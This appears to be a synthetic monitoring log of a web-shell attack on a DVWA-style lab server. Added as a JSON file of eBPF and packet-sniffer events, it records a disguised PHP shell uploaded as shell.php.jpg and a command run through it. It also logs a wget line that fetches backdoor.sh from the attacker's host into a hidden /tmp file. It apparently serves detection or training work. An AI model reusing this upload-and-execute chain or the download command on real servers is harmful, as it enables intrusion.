@@ -1,0 +1,21 @@
+{
+  "id": 13,
+  "timestamp": 1783017600,
+  "events": [
+    "[ebpf] Waiting for encrypted data on /dev/pts/7...",
+    "[network:/dev/pts/11] {\"event\": \"startup\", \"message\": \"Network packet sniffer is running\"}",
+    "[network:/dev/pts/11] {\"event\": \"info\", \"message\": \"Sniffing on interfaces: ['eth0']\"}",
+    "[network:/dev/pts/11] {\"packet_number\": 1, \"timestamp\": \"2026-07-05T18:40:00.000000+00:00\", \"ethernet\": {\"src_mac\": \"52:55:0a:00:02:14\", \"dst_mac\": \"52:54:00:12:34:56\", \"type\": \"0x800\"}, \"network\": {\"version\": 4, \"src_ip\": \"198.51.100.55\", \"dst_ip\": \"10.0.2.3\", \"protocol_number\": 6, \"protocol_name\": \"TCP\", \"ttl\": 52, \"tos\": 0, \"identification\": 7001, \"flags\": \"DF\", \"fragment_offset\": 0, \"total_length\": 512, \"header_length\": 20}, \"transport\": {\"protocol\": \"TCP\", \"src_port\": 53310, \"dst_port\": 80, \"length\": 492, \"checksum\": 51001}, \"http\": {\"type\": \"request\", \"method\": \"POST\", \"path\": \"/hackable/uploads/upload.php\", \"version\": \"HTTP/1.1\", \"headers\": {\"Content-Type\": \"multipart/form-data\", \"Content-Length\": \"2841\"}}, \"payload\": {\"size_bytes\": 472}, \"services\": {\"src_service\": null, \"dst_service\": \"http\"}, \"process\": null, \"direction\": \"inbound\", \"raw_packet_size\": 546}",
+    "[network:/dev/pts/11] {\"event\": \"info\", \"message\": \"multipart body declares field 'uploaded' filename shell.php.jpg, content-type image/jpeg, 2841 bytes\"}",
+    "[ebpf] 18:40:00.200  apache2          7301     33       open       FILE: /tmp/phpPCwkV2 FLAGS: 0x241 [O_CREAT|O_EXCL|O_WRONLY]",
+    "[ebpf] 18:40:00.230  apache2          7301     33       rename     COMM: apache2  PID: 7301    UID: 33      RENAME_TO: /var/www/html/hackable/uploads/shell.php.jpg [MOVED_TO_SERVED_DIR]",
+    "[ebpf] 18:40:00.250  apache2          7301     33       chmod      COMM: apache2  PID: 7301    UID: 33      FLAGS: [CHMOD_CALLED]",
+    "[network:/dev/pts/11] {\"event\": \"info\", \"message\": \"HTTP response 200 to 198.51.100.55 for POST /hackable/uploads/upload.php, body: 'shell.php.jpg successfully uploaded!'\"}",
+    "[network:/dev/pts/11] {\"packet_number\": 2, \"timestamp\": \"2026-07-05T18:40:03.000000+00:00\", \"ethernet\": {\"src_mac\": \"52:55:0a:00:02:14\", \"dst_mac\": \"52:54:00:12:34:56\", \"type\": \"0x800\"}, \"network\": {\"version\": 4, \"src_ip\": \"198.51.100.55\", \"dst_ip\": \"10.0.2.3\", \"protocol_number\": 6, \"protocol_name\": \"TCP\", \"ttl\": 52, \"tos\": 0, \"identification\": 7002, \"flags\": \"DF\", \"fragment_offset\": 0, \"total_length\": 320, \"header_length\": 20}, \"transport\": {\"protocol\": \"TCP\", \"src_port\": 53311, \"dst_port\": 80, \"length\": 300, \"checksum\": 51002}, \"http\": {\"type\": \"request\", \"method\": \"GET\", \"path\": \"/hackable/uploads/shell.php.jpg?cmd=id\", \"version\": \"HTTP/1.1\", \"headers\": {\"Host\": \"dvwa.internal\"}}, \"payload\": {\"size_bytes\": 280}, \"services\": {\"src_service\": null, \"dst_service\": \"http\"}, \"process\": null, \"direction\": \"inbound\", \"raw_packet_size\": 354}",
+    "[ebpf] 18:40:03.050  apache2          7301     33       execve     PATH: /bin/sh -c 'id' FLAGS: [SHELL_INTERPRETER]",
+    "[ebpf] 18:40:03.060  sh               7305     33       execve     PATH: /usr/bin/id",
+    "[network:/dev/pts/11] {\"event\": \"info\", \"message\": \"HTTP response 200 to 198.51.100.55 for GET /hackable/uploads/shell.php.jpg?cmd=id, body: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'\"}",
+    "[ebpf] 18:40:05.010  apache2          7301     33       execve     PATH: /bin/sh -c 'wget http://198.51.100.55:8080/backdoor.sh -O /tmp/.bd' FLAGS: [SHELL_INTERPRETER]",
+    "[ebpf] 18:40:05.020  sh               7309     33       execve     PATH: /usr/bin/wget"
+  ]
+}
